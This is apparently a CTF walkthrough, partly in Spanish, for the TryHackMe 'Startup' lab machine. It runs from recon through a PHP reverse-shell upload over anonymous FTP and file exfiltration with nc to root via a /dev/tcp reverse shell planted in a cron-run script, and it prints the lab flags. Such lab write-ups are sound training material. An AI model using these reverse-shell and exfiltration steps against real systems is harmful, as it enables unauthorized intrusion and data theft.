https://tryhackme.com/r/room/startup

# startup



## Task 1 - Welcome to Spice Hut!

We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!


## Recon

```
nmap -sV -T5 -v 10.10.179.192 -oN nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 21:46 CDT
NSE: Loaded 47 scripts for scanning.
 
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.80 seconds
           Raw packets sent: 1005 (44.196KB) | Rcvd: 1002 (40.080KB)

```

## Port 21 ftp

```
ftp 10.10.179.192
Connected to 10.10.179.192.
220 (vsFTPd 3.0.3)
Name (10.10.179.192:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||47773|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> 

```

```
cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

```
## Port 80

```

No spice here!

Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, contact us. Otherwise, don't you worry. We'll be online shortly!

— Dev Team

```

```
¡Aquí no hay picante!

Disculpen mientras desarrollamos nuestro sitio. Queremos que sea la forma más elegante y práctica de comprar pimientos. Además, necesitamos un desarrollador web. Por cierto, si eres desarrollador web, contáctanos. Si no, no te preocupes. ¡Estaremos online en breve!

— Equipo de Desarrollo
```
### Directorios

```
gobuster dir -u http://10.10.179.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60
 
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 314] [--> http://10.10.179.192/files/]
Progress: 12873 / 220561 (5.84%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 13024 / 220561 (5.90%)
===============================================================
Finished
===============================================================
```

#### /files
```
Index of /files
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[DIR]	ftp/	2025-03-28 03:06 	- 	 
[IMG]	important.jpg	2020-11-12 04:02 	246K	 
[TXT]	notice.txt	2020-11-12 04:53 	208 	 
Apache/2.4.18 (Ubuntu) Server at 10.10.179.192 Port 80
```

## Reverse shell

- Preparamos el payload
```

locate php-reverse 

cp /usr/share/webshells/php/php-reverse-shell.php shell.php

nano shell.php

$ip = '10.13.81.73';  // CHANGE THIS
$port = 4444;       // CHANGE THIS

```

- Lo subimos por ftp
```
 ftp 10.10.179.192
Connected to 10.10.179.192.
220 (vsFTPd 3.0.3)
Name (10.10.179.192:kali): anonymous 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

- no se puede en el raiz

ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||11847|)
553 Could not create file.

- en /ftp si

ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||20462|)
150 Ok to send data.
100% |****************************************************************|  5493        1.90 MiB/s    00:00 ETA
226 Transfer complete.
5493 bytes sent in 00:00 (14.63 KiB/s)
ftp> 

```

- Esuchamos y lanzamos para enlazar
```
nc -lvnp 4444                    
listening on [any] 4444 ...
connect to [10.13.81.73] from (UNKNOWN) [10.10.179.192] 48428
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:14:28 up 29 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
- migramos a tty
```
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash');"
www-data@startup:/$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                       
┌──(kali㉿kali)-[~/tmp/tryhackme/startup]
└─$ stty raw -echo; fg                       
[1]  + continued  nc -lvnp 4444

www-data@startup:/$ export TERM=xterm
www-data@startup:/$ 

```

### What is the secret spicy soup recipe?

```
www-data@startup:/$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

```

### What are the contents of user.txt?

- intentamos ir a home pero nada , sin acceso
```
www-data@startup:/$ cd /home
www-data@startup:/home$ ls
lennie
www-data@startup:/home$ cd lennie/
bash: cd: lennie/: Permission denied
www-data@startup:/home$ 

```

- transferimos el archivo sospechoso

```
- en remoto 
www-data@startup:/$ ls
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
www-data@startup:/$ cd incidents                    
www-data@startup:/incidents$ ls
suspicious.pcapng
 
www-data@startup:/incidents$ nc 10.13.81.73 2030 < suspicious.pcapng
www-data@startup:/incidents$ 


- en kali

┌──(kali㉿kali)-[~/tmp/tryhackme/startup]
└─$ nc -lnvp 2030 > suspicious.pcapng
listening on [any] 2030 ...
connect to [10.13.81.73] from (UNKNOWN) [10.10.179.192] 36300
                                                                                       
┌──(kali㉿kali)-[~/tmp/tryhackme/startup]
└─$ ls suspicious.pcapng 
suspicious.pcapng
                    
```

- abrimos en wireshark y seguimos el stream TCP y encontramos el pass para lennie

```
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
ls

 
www-data@startup:/home$ 
cd lennie

cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
ls

ls
lennie
www-data@startup:/home$ 
cd lennie

cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ 
sudo -l

sudo -l
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3

 

```

- con el pass cambiamos a lennie 
```
www-data@startup:/home$ su lennie
Password: 
lennie@startup:/home$ cd lennie/
lennie@startup:~$ ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt 
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
lennie@startup:~$ 

```

### What are the contents of root.txt?

```
lennie@startup:~$ cd Documents/
lennie@startup:~/Documents$ ls
concern.txt  list.txt  note.txt
lennie@startup:~/Documents$ cat concern.txt 
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie

lennie@startup:~/Documents$ cat list.txt 
Shoppinglist: Cyberpunk 2077 | Milk | Dog food

lennie@startup:~/Documents$ cat note.txt 
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.

```

- exploramos la carpeta de scripts, planner.sh le pertenece a root
```
lennie@startup:~$ pwd
/home/lennie
lennie@startup:~$ ls -la
total 20
drwx------ 4 lennie lennie 4096 Nov 12  2020 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
lennie@startup:~$ cd scripts/
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Mar 28 04:01 startup_list.txt
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ cat startup_list.txt 

lennie@startup:~/scripts$ 


```

- el script le pertenece a root ejecuta /etc/print.sh
```
ennie@startup:~/scripts$ cat /etc/print.sh 
#!/bin/bash
echo "Done!"
lennie@startup:~/scripts$ ls -la /etc/print.sh 
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
lennie@startup:~/scripts$ 

```

- plantamos un reverse shell
- reverse shell generatos: https://www.revshells.com/
```
nano /etc/print.sh

#!/bin/bash
echo "Done!"
exec 5<>/dev/tcp/10.13.81.73/5555;cat <&5 | while read line; do $line 2>&5 >&5;$


- esperamos un minuto

lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 Mar 28 04:06 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Mar 28 04:09 startup_list.txt

```

- esperamos del otro lado
```
┌──(kali㉿kali)-[~/tmp/tryhackme/startup]
└─$ nc -lnvp 5555                    
listening on [any] 5555 ...
connect to [10.13.81.73] from (UNKNOWN) [10.10.179.192] 46008
id;date;hostname
/etc/print.sh: line 3: id;date;hostname: command not found
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}


```